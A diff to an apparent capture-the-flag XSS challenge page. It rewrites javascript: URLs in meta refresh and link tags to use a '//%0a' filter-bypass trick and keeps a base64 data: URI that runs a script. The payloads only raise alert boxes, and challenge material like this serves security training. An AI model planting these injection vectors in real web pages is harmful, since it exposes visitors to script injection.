@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-    <link REL="stylesheet" HREF="javascript:alert('XSS');">
-    <link rel="icon" type="text/html" href="javascript:alert(1);" sizes="32x32">
+    <meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript://%0aalert('XSS');">
+    <link REL="stylesheet" HREF="javascript://%0aalert('XSS');">
+    <link rel="icon" type="text/html" href="javascript://%0aalert(1);" sizes="32x32">
     <meta HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
     <title>CTF XSS Challenge</title>
 </head>
